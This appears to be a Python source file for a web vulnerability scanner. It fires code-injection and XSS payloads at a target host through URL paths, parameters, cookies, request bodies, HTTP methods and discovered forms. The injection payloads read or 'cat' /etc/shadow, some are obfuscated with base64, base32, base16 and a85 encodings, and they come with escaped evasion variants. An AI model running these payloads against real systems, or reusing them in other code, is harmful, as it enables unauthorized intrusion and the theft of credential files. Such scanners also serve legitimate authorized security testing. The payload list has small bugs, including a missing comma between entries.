import io
import re
import time
import urllib.parse
import socket
from urllib.parse import *
import puppy_requests as puppy_requests
from TheSilent.clear import clear
from TheSilent.return_user_agent import return_user_agent

RED = "\033[1;31m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"

init_mal_python = [r"eval(compile('import os\nos.system(\'cat /etc/shadow\')','melon','exec'))",
                   r"eval(compile('import os,base64\nos.system(base64.b64decode(b\'Y2F0IC9ldGMvc2hhZG93\').decode())','melon','exec'))",
                   r"eval(compile('import os,base64\nos.system(base64.b32decode(b\'MNQXIIBPMV2GGL3TNBQWI33X\').decode())','melon','exec'))",
                   r"eval(compile('import os,base64\nos.system(base64.b16decode(b\'636174202F6574632F736861646F77\').decode())','melon','exec'))",
                   r"eval(compile('import os,base64\nos.system(base64.a85decode(b\'@psI%04f6806:f8A8cY\').decode())','melon','exec'))",
                   r"eval(compile('import os\ndef melon():\n    data = open(\'/etc/shadow\',\'r\')\n    data = data.read()\n    return data\nmelon()','melon','exec'))",
                   r"eval(compile('import os,base64\ndef melon():\n    data = open(base64.b64decode(b\'L2V0Yy9zaGFkb3c=\'),\'r\').decode(),\'r\')\n    data = data.read()\n    return data\nmelon()','melon','exec'))",
                   r"eval(compile('import os,base64\ndef melon():\n    data = open(base64.b32decode(b\'F5SXIYZPONUGCZDPO4======\').decode(),\'r\')\n    data = data.read()\n    return data\nmelon()','melon','exec'))",
                   r"eval(compile('import os,base64\ndef melon():\n    data = open(base64.b16decode(b\'2F6574632F736861646F77\').decode(),\'r\')\n    data = data.read()\n    return data\nmelon()','melon','exec'))"
                   r"eval(compile('import os,base64\ndef melon():\n    data = open(base64.a85decode(b\'@psI%04f6806:f8A8cY\').decode(),\'r\')\n    data = data.read()\n    return data\nmelon()','melon','exec'))"]

init_mal_xss = ["<iframe>melon</iframe>",
                "<script>alert('melon')</script>",
                "<script>prompt('melon')</script>",
                "<strong>melon</strong>",]

mal_python = init_mal_python[:]
for mal in mal_python:
    evade = ""
    for char in mal:
        evade += "\\" + char
    init_mal_python.append(evade)
mal_python = init_mal_python[:]

mal_xss = init_mal_xss[:]
for mal in mal_xss:
    evade = ""
    for char in mal:
        evade += "\\" + char
    init_mal_xss.append(evade)
ma_xss = init_mal_xss[:]
    
def melon(host,delay=0):
    print(CYAN + "")
    clear()
    hits = []

    try:
        original_page = puppy_requests.text(host)
        all_forms = re.findall("<form[\S\s\n]+/form>",original_page)

    except:
        pass

    # scan for python injection
    print(CYAN + f"scanning for python injection")
    for mal in mal_python:
        try:
            time.sleep(delay)
            data = puppy_requests.text(host + "/" + urllib.parse.quote_plus(mal))
            if "root:" in data.lower() and "daemon:" in data.lower() and "bin:" in data.lower() and "sys:" in data.lower():
                hits.append(f"python injection in url ({host}): {mal}")

        except:
            pass

        try:
            time.sleep(delay)
            data = puppy_requests.text(host,params={mal:mal})
            if "root:" in data.lower() and "daemon:" in data.lower() and "bin:" in data.lower() and "sys:" in data.lower():
                hits.append(f"python injection in header ({host}): {mal}")

        except:
            pass

        try:
            time.sleep(delay)
            data = puppy_requests.text(host,params={"Cookie":mal})
            if "root:" in data.lower() and "daemon:" in data.lower() and "bin:" in data.lower() and "sys:" in data.lower():
                hits.append(f"python injection in cookie ({host}): {mal}")

        except:
            pass

        try:
            time.sleep(delay)
            data = puppy_requests.text(host,data=mal.encode())
            if "root:" in data.lower() and "daemon:" in data.lower() and "bin:" in data.lower() and "sys:" in data.lower():
                hits.append(f"python injection in body ({host}): {mal}")

        except:
            pass

        try:
            time.sleep(delay)
            data = puppy_requests.text(host,method=mal.upper())
            if "root:" in data.lower() and "daemon:" in data.lower() and "bin:" in data.lower() and "sys:" in data.lower():
                hits.append(f"python injection in method ({host}): {mal}")

        except:
            pass

        try:
            if len(all_forms) > 0:
                for form in all_forms:
                    time.sleep(delay)
                    action_bool = True
                    form_names = []
                    mal_value = []
                    form_method = re.findall("method\s?=\s?[\"\'](\S+)[\"\']",form)[0]
                    form_input = re.findall("<input.+>",form)
                    for field in form_input:
                        form_name = re.findall("name\s?=\s?[\"\'](\S+)[\"\']",field)[0]
                        form_type = re.findall("type\s?=\s?[\"\'](\S+)[\"\']",field)[0]
                        form_names.append(form_name)
                        if form_type.lower() == "button" or form_type.lower() == "hidden"  or form_type.lower() == "submit":
                            mal_value.append(re.findall("value\s?=\s?[\"\'](\S+)[\"\']",field)[0])

                        else:
                            mal_value.append(mal)

                    try:
                        action_tag = re.findall("action\s?=\s?[\"\'](\S+)[\"\']",form)[0]
                        if action_tag.startswith("https://") or action_tag.startswith("http://"):
                            action = action_tag

                        if action_tag.startswith("/"):
                            action = host + action_tag

                        else:
                            action = urllib.parse.urlparse(host).scheme + "://" + urllib.parse.urlparse(host).netloc + "/" + action_tag

                    except IndexError:
                        action_bool = False

                    if action_bool:
                        data = puppy_requests.text(action,method=form_method.upper(),data=dict(zip(form_names,mal_value)))
                        if "root:" in data.lower() and "daemon:" in data.lower() and "bin:" in data.lower() and "sys:" in data.lower():
                            hits.append(f"python injection in forms ({action}): {dict(zip(form_names,mal_value))}")

                    else:
                        data = puppy_requests.text(host,method=form_method.upper(),data=dict(zip(form_names,mal_value)))
                        if "root:" in data.lower() and "daemon:" in data.lower() and "bin:" in data.lower() and "sys:" in data.lower():
                            hits.append(f"python injection in forms ({host})- {dict(zip(form_names,mal_value))}")

        except:
            pass

    # scan for xss
    print(CYAN + f"scanning for xss")
    for mal in mal_xss:
        try:
            time.sleep(delay)
            data = puppy_requests.text(host + "/" + urllib.parse.quote_plus(mal))
            if mal in data:
                hits.append(f"xss in url ({host}): {mal}")

        except:
            pass

        try:
            time.sleep(delay)
            data = puppy_requests.text(host,headers={mal:mal})
            if mal in data:
                hits.append(f"xss in header ({host}): {mal}")

        except:
            pass

        try:
            time.sleep(delay)
            data = puppy_requests.text(host,headers={"Cookie":mal})
            if mal in data:
                hits.append(f"xss in cookie ({host}): {mal}")

        except:
            pass

        try:
            time.sleep(delay)
            data = puppy_requests.text(host,data=mal.encode())
            if mal in data:
                hits.append(f"xss in body ({host}): {mal}")

        except:
            pass

        try:
            time.sleep(delay)
            data = puppy_requests.text(host,method=mal.upper())
            if mal in data:
                hits.append(f"xss in method ({host}): {mal}")

        except:
            pass

        try:
            if len(all_forms) > 0:
                for form in all_forms:
                    time.sleep(delay)
                    action_bool = True
                    form_names = []
                    mal_value = []
                    form_method = re.findall("method\s?=\s?[\"\'](\S+)[\"\']",form)[0]
                    form_input = re.findall("<input.+>",form)
                    for field in form_input:
                        form_name = re.findall("name\s?=\s?[\"\'](\S+)[\"\']",field)[0]
                        form_type = re.findall("type\s?=\s?[\"\'](\S+)[\"\']",field)[0]
                        form_names.append(form_name)
                        if form_type.lower() == "button" or form_type.lower() == "hidden"  or form_type.lower() == "submit":
                            mal_value.append(re.findall("value\s?=\s?[\"\'](\S+)[\"\']",field)[0])

                        else:
                            mal_value.append(mal)

                    try:
                        action_tag = re.findall("action\s?=\s?[\"\'](\S+)[\"\']",form)[0]
                        if action_tag.startswith("https://") or action_tag.startswith("http://"):
                            action = action_tag

                        if action_tag.startswith("/"):
                            action = host + action_tag

                        else:
                            action = urllib.parse.urlparse(host).scheme + "://" + urllib.parse.urlparse(host).netloc + "/" + action_tag

                    except IndexError:
                        action_bool = False

                    if action_bool:
                        data = puppy_requests.text(action,method=form_method.upper(),data=dict(zip(form_names,mal_value)))
                        for _ in mal_xss:
                            if _ in data:
                                hits.append(f"xss in forms ({action}): {dict(zip(form_names,mal_value))}")

                    else:
                        data = puppy_requests.text(host,method=form_method.upper(),data=dict(zip(form_names,mal_value)))
                        for _ in mal_xss:
                            if _ in data:
                                hits.append(f"xss in forms ({host})- {dict(zip(form_names,mal_value))}")

        except:
            pass

    hits = list(set(hits[:]))
    hits.sort()
    clear()
    if len(hits) > 0:
        for hit in hits:
            print(RED + hit)

    else:
        print(GREEN + "we didn't find anything interesting")
